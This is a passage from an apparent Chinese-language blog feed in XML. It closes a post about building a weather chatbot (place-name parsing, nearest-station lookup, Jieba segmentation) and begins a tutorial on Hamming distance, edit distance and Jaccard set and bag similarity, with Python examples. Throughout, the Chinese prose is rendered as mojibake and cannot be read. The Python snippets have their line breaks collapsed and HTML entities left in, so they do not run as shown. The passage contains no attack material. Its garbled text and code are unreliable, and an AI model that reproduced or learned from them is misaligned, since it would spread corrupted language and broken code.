åœ°é»è¦åˆ¤æ–·å¥å­ä¸­çš„åœ°é»çœŸçš„å¾ˆé›£ï¼Œä¸–ç•Œçš„åœ°åäº”èŠ±å…«é–€ï¼Œé€£ã€Œå¤ªé™½ã€éƒ½å¯ä»¥æ˜¯åœ°åã€‚æˆ‘çš„è™•ç†è¾¦æ³•æ˜¯åˆ†å°ç£åœ°å€å’Œåœ‹å¤–åœ°å€ã€‚

å°ç£åœ°å€ï¼šå°ç£çš„è¡Œæ”¿å€æœ€ä½å±¤ç´šæ˜¯æ‘æˆ–é‡Œï¼Œå…¨éƒ¨åŠ èµ·ä¾†ä¹Ÿæ‰ä¸åˆ°ä¸€è¬å€‹ï¼Œæ‰€ä»¥å°ç£åœ°å€å…ˆå»ºæª”ï¼Œå¯ä»¥å¾ˆæ˜ç¢ºçš„è¾¨è­˜å‡ºä¾†ã€‚æª”æ¡ˆåŒ…å«ç¸£å¸‚ã€é„‰é®å¸‚ã€æ‘é‡Œå’Œç¶“ç·¯åº¦è³‡è¨Šã€‚
éè¡Œæ”¿åœ°å€ã€åœ‹å¤–åœ°å€ï¼šå¦‚æœæ˜¯éè¡Œæ”¿å€çš„åœ°åï¼Œä¾‹å¦‚å°ç£å¤§å­¸ã€ç¸½çµ±åºœç­‰ç­‰ï¼Œæˆ–æ˜¯åœ‹å¤–çš„åœ°å€ï¼Œä¾‹å¦‚ç´ç´„ã€æ±äº¬ç­‰ã€‚é€™æ™‚å€™æˆ‘æœƒç”¨ Google Map Api ä¾†æŸ¥å°æ‡‰çš„ç¶“ç·¯åº¦ã€‚

ç‚ºä»€éº¼éƒ½æ˜¯ç¶“ç·¯åº¦å‘¢ï¼Ÿ

å°ç£åœ°å€æœƒå»æŸ¥ä½¿ç”¨è€…æŸ¥è©¢åœ°é»çš„æœ€è¿‘çš„æ¸¬ç«™ï¼Œå› ç‚ºæˆ‘æœ‰æ¯å€‹æ¸¬ç«™çš„ç¶“ç·¯åº¦ï¼Œæ‰€ä»¥æœƒå»ç®—å½¼æ­¤è·é›¢ï¼Œä¸¦å–å¾—æ•¸æ“šã€‚ä¾‹å¦‚æŸ¥å°åŒ—å…¬é¤¨å¤©æ°£ç‹€æ³ï¼Œå› ç‚ºå°ç£å¤§å­¸å°±æœ‰è§€æ¸¬ç«™ï¼ˆå°å¤§å°±åœ¨å…¬é¤¨ï¼‰ï¼Œæ‰€ä»¥æœƒå¾—åˆ°å°ç£å¤§å­¸è§€æ¸¬ç«™çš„æ•¸æ“šè³‡æ–™ã€‚
åœ‹å¤–çš„æ°£è±¡ API é€šå¸¸éƒ½æ˜¯ç”¨ç¶“ç·¯åº¦ç•¶åƒæ•¸ã€‚

å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå°ç£çš„æ°£è±¡æ¸¬ç«™çœŸçš„å¾ˆå¯†ï¼Œå°ç£çš„æ°£è±¡æ¸¬ç«™å¤§ç´„æœ‰å››ç™¾å€‹ï¼Œä½†æ˜¯å¦‚æœæ›åœ¨åœ‹å¤–çš„è©±ï¼Œä¸€å€‹å°ç£å¤§å°çš„å€åŸŸï¼Œå¯èƒ½åªæœ‰ä¸€å€‹æ¸¬ç«™ã€‚æ‰€ä»¥åœ‹å¤–æœå‹™å•†çš„æ°£è±¡è³‡è¨Šå¸¸å¸¸éƒ½æ˜¯ä½¿ç”¨å…§æ’å¤–æ’ä¾†å–å¾—è¿‘ä¼¼å€¼ï¼Œæ›è¨€ä¹‹å°±æ˜¯å¾ˆä¸ç²¾ç¢ºå•¦ï¼ä½†å°ç£å› ç‚ºå¤ªå¯†äº†ï¼Œç›´æ¥æ‰¾æœ€è¿‘çš„æ¸¬ç«™çš„æ•¸æ“šå°±å¥½ï¼Œè€Œä¸”å¾ˆæº–ï¼
åœ°åè™•ç†ç”±æ–¼ä¸­æ–‡å­—æ•´ä¸²é»åœ¨ä¸€èµ·çš„ç‰¹æ€§ï¼Œè¦èƒ½æº–ç¢ºåˆ¤æ–·ä»–æ˜¯ä¸æ˜¯åœ°åï¼Œä¸èƒ½ç›´æ¥ç”¨é€™æ¨£åˆ¤æ–·ï¼š
if(message.includes(&quot;åŒ—æµ·é“&quot;))

å› ç‚ºåŸå¥å¯èƒ½æ˜¯ã€ŒåŒ—æµ·ã€é“è·¯ã€ï¼Œå¤§æ¦‚æ˜¯é€™ç¨®æ„Ÿè¦ºã€‚
é€™é‚Šæˆ‘ç”¨çµå·´åˆ†è©ï¼Œä¾†æŠŠå¥å­åˆ‡å‰²æˆä¸€å€‹å€‹è©ã€‚é€™å€‹æ¨¡çµ„ç°¡å–®åŸç†å°±æ˜¯ç”¨è©é »ä¾†æ±ºå®šè¦ä¸è¦åšåˆ‡å‰²ã€‚ä¸éå…¶å¯¦åœ¨é è¨­å•å¥ä¸­ä¸€å®šè¦æœ‰åœ°åçš„æƒ…æ³ä¸‹ï¼Œé€™æ¨£åšç”¨è™•ä¸å¤§ã€‚å¯¦éš›æ¯”è¼ƒæœ‰æ„Ÿå¯èƒ½æ˜¯åƒ Siri é€™ç¨®å¯ä»¥å›ç­”å„ç¨®å¤©é¦¬è¡Œç©ºå•é¡Œçš„æ©Ÿå™¨äººæ‰è¦èƒ½æ­£ç¢ºè¾¨è­˜æ˜¯ä¸æ˜¯æœ‰åœ°åçš„æ¦‚å¿µï¼Œé‚„æ˜¯åªæ˜¯æ¹Šå·§å…©å€‹å­—é€£åœ¨ä¸€èµ·ç½·äº†ã€‚ä½†è€ƒé‡æœªä¾†å¯æ“´å……æ€§ï¼Œæˆ‘å…ˆæ¡ç”¨æ¯”è¼ƒé«˜ç´šä¸€é»çš„æ–¹å¼è™•ç†ã€‚
ç¸½çµæˆ‘å¤§è‡´ä¸Šå·²ç¶“å°‡æˆ‘å¦‚ä½•å¯¦ä½œæ°£è±¡æ©Ÿå™¨äººçš„æŠ€è¡“éƒ½ä»‹ç´¹äº†ï¼Œæœªä¾†æˆ‘æœƒæŒçºŒè®“ä»–è¶Šä¾†è¶Šå¥½ï¼Œç›®å‰æ¨£æ¿å¼æ¨¡å‹æœ€å¤§ç¼ºé»å°±æ˜¯æœƒæœ‰ç„¡æ³•è¾¨è­˜çš„æƒ…æ³ï¼Œé€™æ™‚å€™æˆ‘æœƒå›æ‡‰è®“ä½¿ç”¨è€…ç›´æ¥æŸ¥çœ‹ä½¿ç”¨èªªæ˜ï¼Œä½†çœŸæ­£å¥½çš„æœå‹™æ˜¯ä¸éœ€è¦ä½¿ç”¨èªªæ˜çš„ï¼Œä¸€å€‹å¥½çš„èŠå¤©æ©Ÿå™¨äººæ‡‰è©²è·Ÿäººä¸€æ¨£è°æ˜å°å§ï¼Ÿ
å¾ˆé«˜èˆˆä¸çŸ¥ä¸è¦ºå°±æœ‰è¶…éä¸€åƒåä½¿ç”¨è€…ï¼Œéš¨è€…ä½¿ç”¨è€…è®Šå¤šï¼Œæœªä¾†æ¶æ§‹å¯èƒ½ä¹Ÿé‚„æœƒéœ€è¦èª¿æ•´ï¼Œå¦‚åŒæ‰€æœ‰è¦æ¨¡é€æ¼¸æˆé•·çš„å…¬å¸çš„å¾Œç«¯æ¶æ§‹ä¸€æ¨£ï¼ŒA&#x2F;B æ¸¬è©¦ã€ç´…è—éƒ¨ç½²ç­‰ç­‰æŠ€è¡“éƒ½æ˜¯éš¨è‘—è¦æ¨¡æ“´å¤§è€Œå°‡æ…¢æ…¢å°å…¥ã€‚

ä½ å¯ä»¥åœ¨é€™é‚ŠæŸ¥çœ‹æ°£è±¡æ©Ÿå™¨äººçš„ Github Repo



é—œæ–¼ä½œè€…åŠ‰å®‰é½Šè»Ÿé«”å·¥ç¨‹å¸«ï¼Œç†±æ„›å¯«ç¨‹å¼ï¼Œæ›´å–œæ­¡æ¨å»£ç¨‹å¼è®“æ›´å¤šäººå­¸æœƒã€‚æ­¡è¿è¿½è¹¤ **å¾®ä¸­å­**ï¼Œæˆ‘æœƒåœ¨ä¸Šé¢åˆ†äº«å„ç¨®æ–°çŸ¥èˆ‡æœ€æ–°ä½œå“ï¼Œä¹Ÿå¯ä»¥å»é€›é€›æˆ‘çš„ å€‹äººç¶²ç«™ æˆ– **Github**ã€‚

]]></content>
      <tags>
        <tag>line-bot</tag>
        <tag>messenger-bot</tag>
        <tag>weather</tag>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>Shingling, MinHashing and Common distance measure I</title>
    <url>/2017/10/01/level-3-shingling-minhashing-and-common-distance-measure-i/</url>
    <content><![CDATA[èª°é©åˆé–±è®€é€™ç¯‡æ–‡ç« ï¼šç†Ÿæ‚‰ Hash, Set, Tries (Prefix and Suffix Tree) ç­‰è³‡æ–™çµæ§‹å’Œæœ‰å¿—å¾äº‹å¤§é‡è³‡æ–™åˆ†æçš„é›»è…¦å·¥ç¨‹å¸«
ä¸»è¦è§£æ±ºå•é¡Œï¼šçµ¦å®šä¸€ä»½æ–‡ä»¶ï¼Œå¦‚ä½•åœ¨ç¶²éš›ç¶²è·¯çš„ç„¡ç›¡æ–‡ä»¶å¤§æµ·ä¸­ï¼Œæ‰¾åˆ°ç›¸ä¼¼çš„æ–‡ä»¶ï¼Ÿä¸»è¦æ‡‰ç”¨ï¼šåµæ¸¬å‰½ç«Š (Plagiarism)ï¼Œæœå°‹å¼•æ“æ¬²å°‹æ‰¾é¡åƒç¶²é ï¼Œç¶²è·¯è³¼ç‰©æˆ–é›»å½±æ¨è–¦ç³»çµ±ä¸­çš„å”åŒéæ¿¾
ç¶±è¦ï¼š

å¦‚ä½•å¿«é€Ÿæ¯”è¼ƒå…©æ–‡ä»¶é›†åˆä¸¦æä¾›é‡åŒ–çµæœ: a.  å¦‚ä½•å®šç¾©ç›¸ä¼¼åº¦ï¼Ÿ b.  å¦‚ä½•é‡æ–°å®šç¾©ç›¸ä¼¼åº¦æ¯”è¼ƒå•é¡Œç‚ºé›†åˆå•é¡Œã€‚ 
å¦‚ä½•å¯¦ç¾å¿«é€Ÿæ¯”è¼ƒé«˜ç›¸ä¼¼åº¦æ–‡ä»¶ï¼ˆç¬¬äºŒç¯‡)  
æ‡‰ç”¨ç›¸ä¼¼æœå°‹æ–¼å·¨é‡è³‡æ–™: minHash and Locality-Sentive Hashing ï¼ˆç¬¬ä¸‰ç¯‡ï¼‰
æ›´å¤šé—œæ–¼ Locality-Sentive Hashing ï¼ˆæœ«ç¯‡ï¼‰

åœ¨é–±è®€é€™ç¯‡æ•™å­¸å¾Œï¼Œå¦³å°‡æœƒå­¸åˆ°ï¼š

ç¾è¡Œçš„æ–‡ç»æŠ€è¡“ä¸­ï¼Œå¦‚ä½•å®šç¾©å…©æ–‡ä»¶çš„ç›¸ä¼¼åº¦ï¼Ÿ
å¦‚ä½•ä½¿ç”¨ Shingle ä¾†è½‰æ›åŸå•é¡Œç‚ºé›†åˆæ¯”è¼ƒå•é¡Œï¼Ÿ
å¦‚ä½•ä½¿ç”¨ Jaccard similarity ä¾†æ¯”è¼ƒæ–‡ä»¶çš„ç›¸ä¼¼åº¦ï¼Ÿ


åœ¨é€²å…¥å¦‚ä½•å¯¦ä½œå¿«é€Ÿä¸”æœ‰æ•ˆæ¯”è¼ƒå¤§é‡æ–‡ä»¶ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆä¾†ç­è§£ä¸€ä¸‹ï¼Œåœ¨ç¾è¡Œçš„æ–‡ç»æŠ€è¡“ä¸­ï¼Œæœ‰å“ªäº›æ•¸å€¼æ¨™æº–ï¼Œå¯ä»¥ç”¨ä¾†é‡åŒ–å…©ä»½æ–‡ä»¶çš„ç›¸ä¼¼ç¨‹åº¦ã€‚
çµ¦å®šå…©å€‹æœ‰è‘—ç›¸åŒé•·åº¦çš„å­—ä¸²ï¼Œæœ€ç°¡å–®çš„æ–¹æ³•ï¼Œä¾¿æ˜¯æˆ‘å€‘å¯ä»¥æ•¸æœ‰å¹¾å€‹ä¸ä¸€æ¨£çš„å­—æ¯ï¼Œä¾†ç•¶ä½œå…©å€‹å­—ä¸²ç›¸ç•°çš„ç¨‹åº¦ã€‚é€™å°±æ˜¯ Hamming Distance æ‰€æ¡ç”¨çš„æ–¹æ³•ï¼Œç°¡å–®çš„èˆ‰ä¾‹ï¼š
Harry  PotterHerry  Potter01000  000000 &#x3D;&gt; è‹¥ç›¸åŒå­—æ¯å‰‡ç”¨ 0ï¼Œä¸åŒå­—æ¯å‰‡ç”¨ 1  
ç”±ä¸Šå¯çœ‹å¾—åˆ°å­—ä¸²ä¸€ï¼šâ€Harry Potterâ€ å’Œå­—ä¸²äºŒï¼šâ€Herry Potterâ€ ç›¸ç•°ç¨‹åº¦åªæœ‰ 1 ï¼ˆç›¸ä¼¼åº¦å‰‡é«˜é” 10ï¼‰ã€‚åŒæ¨£çš„æ¯”è¼ƒå¦å¤–å…©å€‹å­—ä¸²ï¼š  
Harry PotterFerry Poster11000 001000  
å—¯ï¼Œç”¨è‚‰çœ¼çœ‹éƒ½è¦ºå¾—å·®å¾ˆå¤šã€‚ä¸éé›»è…¦æ²’æœ‰è‚‰çœ¼å¯çœ‹ï¼Œä¹Ÿæ²’æœ‰äººå“è¶Šå¤§è…¦å…·æœ‰çš„å¹³è¡Œè™•ç†çš„èƒ½åŠ›ã€‚æ‰€ä»¥è«‹å¹«å¹«é›»è…¦ç­è§£ï¼Œè©²æ€éº¼ç”¨ Hamming distance æ¯”è¼ƒå…©å­—ä¸²çš„ç›¸ç•°ç¨‹åº¦å§ï¼  
from functools import reducefrom operator import adddef hamming_distance(str1, str2):    assert(len(str1) == len(str2))    return(reduce(add, [ch1 != ch2 for ch1, ch2 in zip(str1, str2)]))str1, str2 = &#x27;Harry Potter&#x27;, &#x27;Ferry Poster&#x27;print(&#x27;Hamming distance for \&#x27;&#123;&#125;\&#x27; and \&#x27;&#123;&#125;\&#x27; is &#123;&#125;&#x27;.format(        str1, str2, hamming_distance(str1, str2)))

Hamming distance for &#39;Harry Potter&#39; and &#39;Ferry Poster&#39; is 3

Hamming distance ä¸€é–‹å§‹æ˜¯ç”¨åœ¨é›»ä¿¡é€šè¨Šæ™‚ï¼Œæª¢æŸ¥å‚³è¼¸æ˜¯å¦æ­£ç¢ºï¼Œé€šå¸¸æ•¸ä½å‚³è¼¸éƒ½æ˜¯ä»¥ 0&#x2F;1 ä¾†è¡¨ç¤ºï¼Œä¸€èˆ¬çš„æ‡‰ç”¨æ˜¯ç”¨ä¾†æ¯”è¼ƒå…©å€‹äºŒå…ƒå­—ä¸²ï¼Œå¦‚ 01000â€¦ å’Œ 10000â€¦ã€‚ä½†å¦‚æˆ‘æ‰€èˆ‰çš„ä¾‹å­ï¼Œå…¶æ‡‰ç”¨ä¸¦ä¸åªé™æ–¼äºŒå…ƒå­—ä¸²ï¼Œåªè¦æ˜¯é•·åº¦ç›¸åŒçš„å­—ä¸²ï¼Œçš†å¯ä»¥ç”¨ Hamming distance ä¾†è¡¨ç¤ºç›¸ç•°ç¨‹åº¦ã€‚ä½†é€™ä¸¦ä¸ä»£è¡¨ï¼Œé•·åº¦ç›¸åŒçš„å­—ä¸²ï¼Œéƒ½è¦ç”¨ Hamming distance ä¾†è¡¨ç¤ºã€‚ç‚ºä»€éº¼å‘¢ï¼Ÿ
å› ç‚ºå­—ä¸²çš„ç·¨è¼¯éç¨‹è¦æ¯”æˆ‘å€‘æ‰€çœ‹åˆ°çš„é‚„è¦è¤‡é›œã€‚ä¹Ÿå°±æ˜¯ï¼Œæˆ‘å€‘é›–ç„¶çœ‹åˆ° Harry Potter å’Œ Herry Potter åªç›¸å·®ä¸€å€‹å­—æ¯ï¼Œå¯æ˜¯å¦‚æœ Herry å…¶å¯¦æ˜¯æ‰“å­—å“¡å°‡ Harry å…ˆèª¤çœ‹æˆ Henryï¼Œåˆä¸€æ™‚æ‰‹èª¤æ‰“æˆäº† Herry å‘¢ï¼Ÿé€™æ™‚å€™ï¼Œæˆ‘å€‘å°±éœ€è¦ç¬¬äºŒç¨®æ¸¬é‡å­—ä¸²ç›¸ç•°ç¨‹åº¦ï¼ŒEdit distanceã€‚
å†ç¹¼çºŒæˆ‘å€‘ç²—å¿ƒæ‰“å­—å“¡çš„ä¾‹å­ï¼Œä¹Ÿå°±æ˜¯ Harry å…ˆç¶“æ­·äº†åˆªé™¤ ar ç„¶å¾Œåˆæ–°å¢æˆç‚º enï¼Œè®Šæˆäº† Henryã€‚æœ€å¾Œåˆå°‡ n å–ä»£æˆäº† rï¼Œæ‰æˆç‚ºæˆ‘å€‘ç¾åœ¨æ‰€çœ‹åˆ°çš„ Herryã€‚å¾ Harry åˆ° Herry æ‰€éœ€çš„ç·¨è¼¯æ­¥é©Ÿï¼Œå‰‡åŒ…æ‹¬äº†å…©å€‹åˆªé™¤ (deletions)ï¼Œå…©å€‹æ–°å¢ (insersions) å’Œä¸€å€‹å–ä»£ (replacement)ã€‚å¦‚æœå°‡ç·¨è¼¯çš„æ­·å²è€ƒæ…®åœ¨å…§ï¼Œè€Œä¸åƒ…åªæ˜¯å¦‚ Hamming distance å°±æ‰€è§€å¯Ÿåˆ°çš„å­—ä¸²ä¾†è¨ˆç®—ç›¸ç•°ç¨‹åº¦ï¼ŒHerry è·Ÿ Harry çš„è·é›¢å…¶å¯¦æ¯”æˆ‘å€‘æ‰€æƒ³åƒçš„é‚„è¦é™é å“ªï¼
è€Œå®šç¾©æœ‰æ•ˆçš„ç·¨è¼¯æ­¥é©Ÿï¼Œå‰‡å› æ‡‰ç”¨è€Œç•°ã€‚ä¸€èˆ¬æœ€ç°¡å–®çš„æ‡‰ç”¨åƒ…æœƒè€ƒæ…®ï¼Œåˆªé™¤å’Œæ–°å¢ï¼Œå› ç‚ºå–ä»£æœ¬èº«å°±åŒ…å«äº†ä¸€å€‹åˆªé™¤å’Œä¸€å€‹æ–°å¢ã€‚ä½†åœ¨ç”Ÿç‰©è³‡è¨Šçš„æ‡‰ç”¨ä¸Šï¼Œé€šå¸¸æœƒå‡è¨­çªè®Šå–ä»£çš„å¯èƒ½ã€‚ä¹Ÿå°±æ˜¯è‹¥ä»¥ DNA åºåˆ—ç‚ºä¾‹ï¼Œèˆ‡å…¶å°‡é¹¼åŸºçš„çªè®Šï¼Œçœ‹æˆå…©å€‹æ­¥é©Ÿï¼Œå…¶å¯¦ç•¶ä½œä¸€å€‹æ­¥é©Ÿçš„å¯èƒ½æ€§è¼ƒé«˜ï¼Œæ‰€ä»¥åˆå¦å¤–å¢åŠ äº†å–ä»£çš„ç·¨è¼¯æ­¥é©Ÿã€‚æ­¤å¤–ï¼Œç”¨ Edit distanceï¼Œæˆ‘å€‘å†ä¹Ÿä¸éœ€è¦éœ€è¦é•·åº¦ç›¸åŒé€™å€‹é™åˆ¶äº†ï¼Œå› ç‚ºåˆªé™¤å’Œæ–°å¢çš„å…©å€‹ç·¨è¼¯æ­¥é©Ÿï¼Œæˆ‘å€‘å¯ä»¥ä»»æ„æ¯”è¼ƒå…©å€‹é•·åº¦ä¸åŒçš„å­—ä¸²äº†ã€‚
ç¾åœ¨ï¼Œæˆ‘å€‘éœ€è¦å†å›åˆ° Hamming distance ä¸Šã€‚å’Œ Hamming distance è§€å¿µä¸Šç›¸è¿‘ï¼Œä½†æ¸¬é‡çš„æ˜¯å…©é›†åˆï¼ˆsetï¼‰çš„ç›¸ä¼¼ç¨‹åº¦ï¼Œä¸€èˆ¬å‰‡æ˜¯ä½¿ç”¨ Jaccard Similarityã€‚å¦‚æœï¼Œä»Šå¤©æˆ‘å€‘æ¯”è¼ƒçš„ä¸æ˜¯å…©å€‹å­—ä¸²ï¼Œè€Œæ˜¯å…©ä»½æ–‡ä»¶å‘¢ï¼Ÿåœ¨è¬›åˆ°æ¯”è¼ƒæ–‡ä»¶å‰ï¼Œè®“æˆ‘å€‘å›åˆ°å­¸ç”Ÿæ™‚ä»£ï¼Œè€å¸«è¦æª¢æŸ¥å­¸ç”Ÿçš„å‡ºå¸­æ™‚ï¼Œæ˜¯æ€éº¼åšçš„å‘¢ï¼Ÿ  
ä¸€èˆ¬ç•¶ç„¶æ˜¯æŒ‰ç…§å­¸ç”Ÿåå†Šï¼Œé€ä¸€æ¯”å°å‡ºå¸­çš„åŒå­¸ï¼Œç„¶å¾Œçœ‹æœ‰å¤šå°‘åŒå­¸æ˜¯æœ‰å‡ºå¸­ï¼Œæœ‰å¤šå°‘æ˜¯ç¼ºå¸­çš„ã€‚é€™å€‹æ¯”è¼ƒç›¸åŒçš„éç¨‹ï¼Œå°±æ¶‰åŠäº†æ±‚äº¤é›†ï¼ˆintersectionï¼‰ çš„è§€å¿µã€‚
æˆ‘å€‘å¯ä»¥å°‡è€å¸«çš„å­¸ç”Ÿåå†Šå’Œåœ¨æ•™å®¤è£¡çš„å­¸ç”Ÿç•¶ä½œæ˜¯å…©å€‹é›†åˆï¼Œé€™å…©å€‹é›†åˆéƒ½ä¸åŒ…å«é‡è¤‡çš„å­¸è™Ÿæˆ–å­¸ç”Ÿï¼Œæ›å¥è©±èªªå…©é›†åˆä¸­çš„å…ƒç´ éƒ½æ˜¯ç¨ä¸€ç„¡äºŒçš„ï¼Œä½†å…©é›†åˆå»å¯ä»¥æ‰¾åˆ°ä¸€å°ä¸€ï¼Œæˆ–ä¸€å°ç„¡çš„å°æ˜ ã€‚ä¸€å°ç„¡çš„æƒ…æ³å¯ä»¥è©¦æƒ³ï¼Œæœ‰å­¸ç”Ÿé€€é¸é€™é–€èª²ï¼Œä½†å­¸ç”Ÿåå†Šæ²’æœ‰ç«‹å³æ›´æ–°ï¼Œæˆ–æ²’æœ‰è¨»å†Šé€™é–€èª²çš„å­¸ç”Ÿä¾†æ—è½ã€‚  
æ‰€ä»¥ï¼Œå¦‚æœæˆ‘å€‘æ„Ÿèˆˆè¶£çš„å•é¡Œæ˜¯ï¼Œæœ‰å¤šå°‘å­¸ç”Ÿå‡ºå¸­ä»Šå¤©çš„èª²ï¼Ÿé‚£éº¼æˆ‘å€‘å°±å¯ä»¥è¨ˆç®—åœ¨å‡ºå¸­å­¸ç”Ÿä½”è¨»å†Šå­¸ç”Ÿå’Œæ—è½å­¸ç”Ÿçš„æ¯”ä¾‹ã€‚åœ¨åˆ†æ¯çš„éƒ¨ä»½ï¼Œä¹Ÿå°±æ˜¯è¨ˆç®—å‡ºå¸­å­¸ç”Ÿå’Œè¨»å†Šå­¸ç”Ÿçš„å…±åŒé›†åˆå‰‡æ˜¯æ±‚è¯é›†çš„è§€å¿µ (union)ã€‚æˆ‘å€‘å¯ä»¥æ ¹æ“šå¸¸ç†æ¨æ–·ï¼Œç¸½å‡ºå¸­äººæ•¸çµ•å°ä¸æœƒå¤šæ–¼å…©é›†åˆçš„è¯é›†ï¼Œä¹Ÿå°±æ˜¯æ¯”ä¾‹æœƒåœ¨ 0 å’Œ 1 çš„å°é–‰å€é–“å…§ï¼Œå…¶å€¼ä¸æœƒå¤§æ–¼ 1 æˆ–å°æ–¼ 0ã€‚å› ç‚ºä½¿ç”¨äº¤é›†å’Œè¯é›†çš„æ¯”ä¾‹ï¼Œæ‰€æœ‰ä¸åŒå¤§å°çš„å…©é›†åˆç›¸ä¼¼åº¦ï¼Œéƒ½å¯ä»¥æ˜ å°„åˆ° 0 å’Œ 1 çš„æ•¸å€¼ï¼ˆå¯æ˜¯ï¼Œé€™æ¨£æœƒæœ‰å€‹å°å•é¡Œï¼Œä¾†çŒœçŒœçœ‹æ˜¯ä»€éº¼å§ï¼Ÿè¨»1ï¼‰ï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿå¯ä»¥æ”¾å¿ƒçš„ç”¨é€™å€‹æ¯”ä¾‹ä¾†ç•¶ä½œè¨ˆé‡æ–¹æ³•é€²è¡Œæ¯”è¼ƒã€‚ 
æ—¢ç„¶ï¼Œæˆ‘å€‘å·²ç¶“å¾ Hamming distance çš„å­—ä¸²æ¯”è¼ƒï¼Œå‡ç´šåˆ°æ¯”è¼ƒé›†åˆçš„è§€å¿µã€‚ä½†åœ¨ç­ç´šçš„æ¯”å–»ä¸­ï¼Œæˆ‘å€‘å°æ–¼é›†åˆä¸­çš„å…ƒç´ ï¼Œæœ‰ä¸€å€‹å‡è¨­ï¼Œè¾¨è­˜é›†åˆä¸­çš„å…ƒç´ ä¸èƒ½é‡è¤‡ï¼Œäº‹å¯¦ä¸Šä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå› ç‚ºæ²’æœ‰å…©å€‹äººæ˜¯ç›¸åŒçš„ï¼Œé€™æ¨£ä¸æ“æœ‰é‡è¤‡å…ƒç´ çš„é›†åˆï¼Œå«åš Setã€‚ä½†æ˜¯ï¼Œåœ¨æ¯”è¼ƒå­—ä¸²ä¸­ï¼Œé€™æ¨£çš„é›†åˆé¡¯ç„¶æ˜¯ä¸æœƒç™¼ç”Ÿçš„ï¼Œæ–¼æ˜¯æˆ‘å€‘å°±éœ€è¦å»¶ä¼¸ Jaccard similarity çš„è¨ˆç®—åˆ°èƒ½æ“æœ‰é‡è¤‡å…ƒç´ çš„é›†åˆï¼Œé€™æ¨£çš„è³‡æ–™çµæ§‹ç¨±ç‚º Bag æˆ–æ˜¯ Multisetï¼Œè€Œå…© Bags ä¹‹é–“çš„ Jaccard similarity å‰‡åˆç¨±ç‚º Jaccard Bag Similarityã€‚åœ¨å®šç¾© Jaccard Bag Similarity æ™‚ï¼Œæ±‚äº¤é›†å¯ä»¥ç”¨æ±‚æ¯å€‹å…ƒç´ å‡ºç¾åœ¨å…©é›†åˆçš„æœ€å°é »ç‡ï¼Œè€Œè¯é›†çš„éƒ¨ä»½å‰‡æœ‰å…©å€‹åšæ³•ï¼Œä¸€æ˜¯ç”¨æ¯å€‹å…ƒç´ åœ¨å…©é›†åˆå‡ºç¾é »ç‡çš„ç¸½å’Œï¼Œä½†é€™æ¨£çš„å•é¡Œæ˜¯ï¼Œ Jaccard Bag similarity çš„æœ€å¤§å€¼ï¼Œå°±ä¸å†æ˜¯ 1 è€Œæ˜¯ 1&#x2F;2ã€‚ç‚ºäº†èƒ½ç¹¼çºŒç¶­æŒ Jaccard similarity çš„ç‰¹æ€§ï¼Œç”¨æœ€å¤§é »ç‡ä¾†ä»£è¡¨è¯é›†ï¼Œè¼ƒå¸¸ä½¿ç”¨æ–¼ä¸åŒå…ƒç´ æ•¸é‡çš„ Bag æ¯”è¼ƒã€‚
æ‹¿æ›¸ä¸Šçš„ç·´ç¿’ä¾†ä½œä¾‹å­[1, Exercise 3.1.2]ï¼šå‡è¨­æœ‰ä¸‰å€‹ bags åˆ†åˆ¥ç‚ºï¼š
A &#x3D; {1, 1, 1, 2}B &#x3D; {1, 1, 2, 2, 3}  
å‰‡è‹¥å°‡ A, B ç•¶ä½œä¸å¯æœ‰é‡è¤‡å…ƒç´ çš„ Set ä¾†çœ‹ï¼Œé›†åˆæœƒè®Šæˆï¼šA &#x3D; {1, 2}B &#x3D; {1, 2, 3}  
å‰‡ Jaccard similarity ç‚º$\frac{A \cap B}{A \cup B} &#x3D; \frac{\{1, 2\}}{\{1, 2, 3\}}&#x3D; \frac{2}{3}$ä½†è‹¥æ˜¯å°‡ A, B ç•¶ä½œå¯æœ‰é‡è¤‡å…ƒç´ çš„ Bag&#x2F;MultiSet ä¾†çœ‹ï¼Œå‰‡ Jaccard Bag Similairity å‰‡ç‚ºï¼š$\frac{A \cap B}{A \cup B} &#x3D;\ \frac{min(A, B)}{max(A, B)} &#x3D;\ \frac{2+1+0}{3+2+1}&#x3D;\frac{1}{2}$
çœ‹èµ·ä¾†å°±æ²’æœ‰é€™éº¼ç›¸ä¼¼å•¦ï¼é€™å°±æ˜¯ Jaccard Similarity çš„å®šç¾©ã€‚è€Œç°¡å–®çš„ python code å’Œå…©å€‹ä¾‹å­ä»£è¡¨çš„ Venn Graph å‰‡æ˜¯å¦‚ä¸‹ï¼š
from functools import reducefrom operator import or_from operator import and_from operator import addfrom itertools import zip_longestfrom collections import namedtupledef jaccard_similarity(str1, str2, allow_repeat=False):    if not allow_repeat:        if type(str1) == set and type(str2) == set:            uniqs = [str1, str2]        uniqs = list(map(set, [str1, str2]))        return(len(reduce(and_, uniqs))/len(reduce(or_, uniqs)))    else:        freqs = &#123;k: [0, 0]                 for k in reduce(or_, list(map(set, [str1, str2])))&#125;        for ch1, ch2 in zip_longest(str1, str2):            if ch1 is not None:                freqs[ch1][0] += 1            if ch2 is not None:                freqs[ch2][1] += 1        return(reduce(add, map(min, freqs.values()))/ reduce(add, map(max, freqs.values())))        str1, str2 = &#x27;1112&#x27;, &#x27;11223&#x27;print(&#x27;Jaccard Similarity for sets \&#x27;&#123;&#125;\&#x27; and \&#x27;&#123;&#125;\&#x27; is &#123;:.2f&#125;:&#x27;.format(        str1, str2, jaccard_similarity(str1, str2)))print(&#x27;Jaccard Similarity for bags \&#x27;&#123;&#125;\&#x27; and \&#x27;&#123;&#125;\&#x27; is &#123;:.2f&#125;:&#x27;.format(        str1, str2, jaccard_similarity(str1, str2, True)))

Jaccard Similarity for sets &#39;1112&#39; and &#39;11223&#39; is 0.67:
Jaccard Similarity for bags &#39;1112&#39; and &#39;11223&#39; is 0.50:


å†é€²å…¥ Shingle çš„è§€å¿µå‰ï¼Œè®“æˆ‘å€‘ç¨å¾®æ•´ç†ä¸€ä¸‹ä¹‹å‰æ‰€èªªçš„ï¼›
